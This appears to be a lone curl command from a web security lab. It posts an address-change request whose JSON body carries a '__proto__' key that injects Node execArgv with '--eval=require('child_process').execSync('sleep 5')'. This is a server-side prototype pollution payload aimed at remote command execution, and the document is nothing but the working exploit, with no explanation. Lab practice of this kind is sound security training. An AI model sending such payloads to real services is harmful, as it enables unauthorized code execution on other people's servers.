curl -s \
  -b "session=<session-cookie>" \
  -d "{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"UK\",\"sessionId\":\"<session-cookie>\",\"__proto__\":{\"execArgv\":[\"--eval=require('child_process').execSync('sleep 5')\"]}}" \
  "$BASE_LAB_URL/my-account/change-address"
